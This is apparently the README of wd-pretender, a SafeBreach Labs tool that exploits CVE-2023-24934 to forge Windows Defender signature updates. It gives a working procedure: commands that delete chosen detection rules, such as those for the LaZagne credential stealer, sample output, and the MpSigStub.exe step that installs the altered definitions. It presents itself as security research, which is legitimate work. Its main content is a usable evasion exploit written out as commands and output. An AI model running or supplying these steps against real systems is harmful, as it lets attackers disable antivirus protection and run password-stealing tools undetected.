# wd-pretender

## TL;DR
Compatible with Windows Defender platform version 4.18.2302.7 and earlier.


## Description
wd-pretender is a powerful tool designed to simulate a Windows Defender update using the [CVE-2023-24934](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-24934) vulnerability. This tool is intended for educational and research purposes only and should be used responsibly and with proper authorization. The primary objective of wd-pretender is to demonstrate potential security vulnerabilities and raise awareness about the importance of robust endpoint security measures.

## Features
- Bypass EDR Rules: Bypass certain Windows Defender security measures and remain undetected.

## Usage
```
-- Defender-Pretender: v1.0.0 (SafeBreach Labs) --

[+] Getting Signatures Location ...
usage: wd-pretender.py command [options]

Windows Defender Update

positional arguments:
  {bypass}
    bypass              bypass windows defender threats

optional arguments:
  -h, --help            show this help message and exit
  -o O                  output folder for the exported vdm files
  -d D                  set explicit definition update path
```

### Bypass
```
usage: wd-pretender.py command [options] bypass [-h] [-match MATCH | -name NAME | -id ID]

optional arguments:
  -h, --help    show this help message and exit
  -match MATCH  delete all threats that his name containes <name>
  -name NAME    delete threat by name
  -id ID        delete threat by his id
```

For example we want to bypass LaZagne rules and be able to execute LaZagne without been detected by Windows Defender.

```
python wd-pretender.py -o C:\BypassDefs bypass -match lazagne
```

Output:

```
python .\wd-pretender.py -o C:\BypassDefs bypass -match lazagne

        -- Defender-Pretender: v1.0.0 (SafeBreach Labs) --

[+] Getting Signatures Location ...
[+] Definitions Path: C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{0E0FDC3E-A1A1-4500-9BEF-460F8E72E1C7}
[+] Initializing DefinitionUpdate
[+] Loading mpasbase.vdm
[+] Loading mpasdlta.vdm
[+] Loading mpavbase.vdm
[+] Loading mpavdlta.vdm

[#] Delete threats from Anti-Spyware definitions
[#] Delete threats from Anti-Virus definitions
      Deleting -> b'\xd8!LaZagne'
      Deleting -> b'HackTool:Python/LaZagne'
      Deleting -> b'HackTool:Python/LaZagne.A!MTB'
      Deleting -> b'\xd8!LaZagne!ml'
      Deleting -> b'HackTool:Python/LaZagne.D!MTB'
      Deleting -> b'\xcc!Golazagne.A!MTB'
      Deleting -> b'HackTool:Python/LaZagne.B'
      Deleting -> b'\xd8!LaZagne!sms'
      Deleting -> b'\xcc!Lazagne.A!MTB'
      Deleting -> b'\xcc\xe1Lazagne'
[+] Exporting definitions into: C:\BypassDefs
[+] mpasdlta.vdm: 1.389.2098.0 -> 1.389.2099.0
[+] mpavdlta.vdm: 1.389.2098.0 -> 1.389.2099.0
```
The output displays the deleted threat rules recorded by the tool, indicating the removal of 10 threats from the Anti-Virus definitions. The newly updated definitions have been exported to the user-supplied export path located at C:\BypassDefs.

To proceed, ensure that MpSigStub.exe is copied to the BypassDefs folder. Following that, execute the following command:

```
MpSigStub.exe /stub 1.1.18500.10 /payload <defintion_new_version>
```
The export log generated by wd-pretender confirms the presence of the updated definitions with the version indicated as <definition_new_version>.

To verify the successful update, please refer to the "MpSigStub.log" file located in the Temp folder of the user with whom the execution took place. For instance, if the tool was executed with administrator privileges (although it is not a requirement), the log file can be found at C:\Windows\Temp.
